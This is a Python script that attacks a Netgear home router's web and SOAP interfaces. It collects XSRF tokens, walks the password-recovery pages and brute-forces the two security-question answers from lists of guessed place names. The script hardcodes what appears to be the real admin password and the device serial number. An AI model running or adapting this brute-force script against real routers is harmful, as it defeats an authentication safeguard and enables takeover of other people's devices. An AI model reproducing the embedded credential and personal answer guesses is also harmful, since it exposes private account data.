#!/usr/bin/env python3
"""Final SOAP probe - XSRF token + web login chain."""
import urllib3, requests, re
urllib3.disable_warnings()

GW = "https://192.168.1.1"
AUTH = ("admin", "Family10130120")
SOAP_URL = GW + "/soap/server_sa/"
SERIAL = "6YN3477TD0A60"

ENVELOPE = (
    '<?xml version="1.0" encoding="utf-8" ?>'
    '<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"'
    ' s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">'
    '<s:Body>{body}</s:Body>'
    '</s:Envelope>'
)

def soap(action, ns, body_xml, session, auth=None, extra_headers=None):
    data = ENVELOPE.format(body=body_xml)
    h = {
        "SOAPAction": f"urn:NETGEAR-ROUTER:service:{ns}#{action}",
        "Content-Type": "text/xml; charset=utf-8",
    }
    if extra_headers:
        h.update(extra_headers)
    kw = dict(headers=h, verify=False, timeout=10)
    if auth:
        kw["auth"] = auth
    return session.post(SOAP_URL, data=data, **kw)


def get_rc(text):
    m = re.search(r"<ResponseCode>(\d+)</ResponseCode>", text)
    return m.group(1) if m else "N/A"


# ── Test 1: XSRF token + SOAP ──
print("=" * 60)
print("TEST 1: GET / to collect XSRF token, then SOAP with token")
print("=" * 60)
s = requests.Session()
s.verify = False

r = s.get(GW + "/", auth=AUTH, timeout=10)
print(f"  GET /: code={r.status_code}, cookies={dict(s.cookies)}")
xsrf = s.cookies.get("XSRF_TOKEN", "")
print(f"  XSRF_TOKEN={xsrf}")

# Try ParentalControl Authenticate with XSRF
body = '<m:Authenticate xmlns:m="urn:NETGEAR-ROUTER:service:ParentalControl:1"></m:Authenticate>'
r2 = soap("Authenticate", "ParentalControl:1", body, s, auth=AUTH)
print(f"  PC Auth: rc={get_rc(r2.text)}")

# Try ConfigurationStarted with XSRF in header
body = '<m:ConfigurationStarted xmlns:m="urn:NETGEAR-ROUTER:service:DeviceConfig:1"><NewSessionID>33333333</NewSessionID></m:ConfigurationStarted>'
r3 = soap("ConfigurationStarted", "DeviceConfig:1", body, s, auth=AUTH,
          extra_headers={"X-XSRF-TOKEN": xsrf})
print(f"  ConfigStarted (X-XSRF-TOKEN): rc={get_rc(r3.text)}")

# Try without X- prefix
r3b = soap("ConfigurationStarted", "DeviceConfig:1", body, s, auth=AUTH,
           extra_headers={"XSRF-TOKEN": xsrf})
print(f"  ConfigStarted (XSRF-TOKEN): rc={get_rc(r3b.text)}")
print()

# ── Test 2: Complete web recovery flow → then SOAP ──
print("=" * 60)
print("TEST 2: Complete web recovery flow → cookies → SOAP")
print("=" * 60)
s2 = requests.Session()
s2.verify = False

# Step 1: GET / with auth → get recovery page + any cookies
r_root = s2.get(GW + "/", auth=AUTH, timeout=10)
print(f"  Step1 GET /: code={r_root.status_code}, cookies={dict(s2.cookies)}")

# Extract the form action URL with the id token
m_action = re.search(r'action="securityquestions\.cgi\?id=([^"]+)"', r_root.text)
if not m_action:
    # Try the MNU recovery index page
    r_root = s2.get(GW + "/MNU_access_setRecovery_index.htm", auth=AUTH, timeout=10)
    m_action = re.search(r'action="securityquestions\.cgi\?id=([^"]+)"', r_root.text)
    print(f"  Tried MNU recovery, code={r_root.status_code}")

if m_action:
    token = m_action.group(1)
    print(f"  Token: {token[:30]}...")

    # Step 2: POST serial number
    r_serial = s2.post(
        GW + f"/securityquestions.cgi?id={token}",
        data={"serialNumber": SERIAL, "Continue": "Continue"},
        auth=AUTH, timeout=10
    )
    print(f"  Step2 POST serial: code={r_serial.status_code}, cookies={dict(s2.cookies)}")

    # Check if we got the security questions page
    if "answer1" in r_serial.text:
        # Extract passwordrecovered action URL
        m_action2 = re.search(r'action="passwordrecovered\.cgi\?id=([^"]+)"', r_serial.text)
        if m_action2:
            token2 = m_action2.group(1)
            print(f"  Got questions page, token2: {token2[:30]}...")

            # Try submitting answers (even if wrong) to see if we get a session
            # Try multiple answer combos
            answers = [
                ("opelika", "queens"),
                ("Opelika", "Queens"),
                ("OPELIKA", "QUEENS"),
                ("opelika", "new york"),
                ("opelika", "Queens, NY"),
                ("opelika", "queen"),
            ]
            for a1, a2 in answers:
                r_ans = s2.post(
                    GW + f"/passwordrecovered.cgi?id={token2}",
                    data={"answer1": a1, "answer2": a2, "Continue": "Continue"},
                    auth=AUTH, timeout=10
                )
                if "alertMessage" not in r_ans.text and "does not match" not in r_ans.text:
                    print(f"  *** POSSIBLE SUCCESS with {a1}/{a2}! ***")
                    print(f"  body={r_ans.text[:500]}")
                    break
                else:
                    print(f"  Rejected: {a1} / {a2}")
            else:
                print("  All answer combos rejected")
        else:
            print("  No passwordrecovered form found")
            # Show what we got
            print(f"  body={r_serial.text[:500]}")
    else:
        print(f"  No answer1 field in response")
        print(f"  body={r_serial.text[:500]}")
else:
    print("  NO TOKEN FOUND in page")
    print(f"  body={r_root.text[:500]}")
print()

# ── Test 3: Try port 5000 SOAP ──
print("=" * 60)
print("TEST 3: Try SOAP on port 5000")
print("=" * 60)
for proto in ["http", "https"]:
    url = f"{proto}://192.168.1.1:5000/soap/server_sa/"
    try:
        body = '<m:Authenticate xmlns:m="urn:NETGEAR-ROUTER:service:ParentalControl:1"></m:Authenticate>'
        data = ENVELOPE.format(body=body)
        h = {"SOAPAction": "urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate",
             "Content-Type": "text/xml; charset=utf-8"}
        r = requests.post(url, data=data, headers=h, auth=AUTH, verify=False, timeout=5)
        print(f"  {proto}:5000 → code={r.status_code}, rc={get_rc(r.text)}")
    except Exception as e:
        print(f"  {proto}:5000 → {type(e).__name__}: {e}")
print()

# ── Test 4: Brute-force the security questions ──
# The router's js has 8 questions. The user set Q1 and Q2.
# Maybe the answers have trailing spaces, are capitalized differently, etc.
# Let's try: Capitals, lowercase, title case for common answers
print("=" * 60)
print("TEST 4: Extended answer brute force")
print("=" * 60)
s3 = requests.Session()
s3.verify = False

# Get fresh token
r_root = s3.get(GW + "/MNU_access_setRecovery_index.htm", auth=AUTH, timeout=10)
m_action = re.search(r'action="securityquestions\.cgi\?id=([^"]+)"', r_root.text)
if m_action:
    token = m_action.group(1)
    r_serial = s3.post(
        GW + f"/securityquestions.cgi?id={token}",
        data={"serialNumber": SERIAL, "Continue": "Continue"},
        auth=AUTH, timeout=10
    )
    m_action2 = re.search(r'action="passwordrecovered\.cgi\?id=([^"]+)"', r_serial.text)
    if m_action2:
        token2 = m_action2.group(1)
        # Extended answer list
        q1_options = ["opelika", "Opelika", "OPELIKA", "auburn", "Auburn", "AUBURN",
                       "montgomery", "Montgomery", "birmingham", "Birmingham"]
        q2_options = ["queens", "Queens", "QUEENS", "new york", "New York", "NEW YORK",
                       "new york city", "New York City", "nyc", "NYC",
                       "bronx", "Bronx", "brooklyn", "Brooklyn",
                       "manhattan", "Manhattan", "queen", "Queen"]

        found = False
        count = 0
        for a1 in q1_options:
            for a2 in q2_options:
                # Need fresh token for each attempt (router may invalidate)
                r_ans = s3.post(
                    GW + f"/passwordrecovered.cgi?id={token2}",
                    data={"answer1": a1, "answer2": a2, "Continue": "Continue"},
                    auth=AUTH, timeout=10
                )
                count += 1
                if "alertMessage" not in r_ans.text and "does not match" not in r_ans.text:
                    print(f"  *** SUCCESS #{count}: {a1} / {a2} ***")
                    print(f"  body={r_ans.text[:500]}")
                    found = True
                    break
                # Check if token expired
                if "timestamp" in r_ans.text.lower():
                    print(f"  Token expired after {count} attempts, refreshing...")
                    # Get new token chain
                    r_root = s3.get(GW + "/MNU_access_setRecovery_index.htm", auth=AUTH, timeout=10)
                    m_action = re.search(r'action="securityquestions\.cgi\?id=([^"]+)"', r_root.text)
                    if m_action:
                        token = m_action.group(1)
                        r_serial = s3.post(
                            GW + f"/securityquestions.cgi?id={token}",
                            data={"serialNumber": SERIAL, "Continue": "Continue"},
                            auth=AUTH, timeout=10
                        )
                        m_action2 = re.search(r'action="passwordrecovered\.cgi\?id=([^"]+)"', r_serial.text)
                        if m_action2:
                            token2 = m_action2.group(1)
                        else:
                            print("  Could not refresh token, stopping")
                            found = True
                            break
            if found:
                break

        if not found:
            print(f"  All {count} combos rejected")
    else:
        print("  No passwordrecovered form")
else:
    print("  No token found")

print()
print("=== ALL TESTS DONE ===")
